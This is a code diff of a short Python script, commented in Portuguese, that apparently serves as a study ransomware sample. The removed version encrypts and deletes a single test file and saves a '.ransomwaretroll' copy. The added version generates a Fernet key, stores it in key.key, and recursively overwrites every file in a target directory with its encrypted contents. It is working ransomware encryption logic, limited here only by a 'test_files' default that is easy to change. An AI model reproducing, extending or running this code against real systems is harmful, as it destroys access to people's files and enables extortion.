@@ -1,24 +1,38 @@
 import os
-import pyaes
+from cryptography.fernet import Fernet
 
-## abrir o arquivo a ser criptografado
-file_name = "teste.txt"
-file = open(file_name, "rb")
-file_data = file.read()
-file.close()
+# Gera uma chave e salva em um arquivo
+def generate_key():
+    key = Fernet.generate_key()
+    with open("key.key", "wb") as key_file:
+        key_file.write(key)
+    return key
 
-## remover o arquivo
-os.remove(file_name)
+# Carrega a chave existente
+def load_key():
+    return open("key.key", "rb").read()
 
-## chave de criptografia
-key = b"testeransomwares"
-aes = pyaes.AESModeOfOperationCTR(key)
+# Criptografa todos os arquivos no diretório alvo
+def encrypt_files(key, target_dir="test_files"):
+    fernet = Fernet(key)
+    for root, _, files in os.walk(target_dir):
+        for file in files:
+            file_path = os.path.join(root, file)
+            with open(file_path, "rb") as f:
+                data = f.read()
+            encrypted_data = fernet.encrypt(data)
+            with open(file_path, "wb") as f:
+                f.write(encrypted_data)
+    print(f"Arquivos no diretório '{target_dir}' foram criptografados.")
 
-## criptografar o arquivo
-crypto_data = aes.encrypt(file_data)
+if __name__ == "__main__":
+    # Gera ou carrega a chave
+    if not os.path.exists("key.key"):
+        print("Gerando chave...")
+        key = generate_key()
+    else:
+        print("Carregando chave existente...")
+        key = load_key()
 
-## salvar o arquivo criptografado
-new_file = file_name + ".ransomwaretroll"
-new_file = open(f'{new_file}','wb')
-new_file.write(crypto_data)
-new_file.close()
+    # Criptografa os arquivos
+    encrypt_files(key)
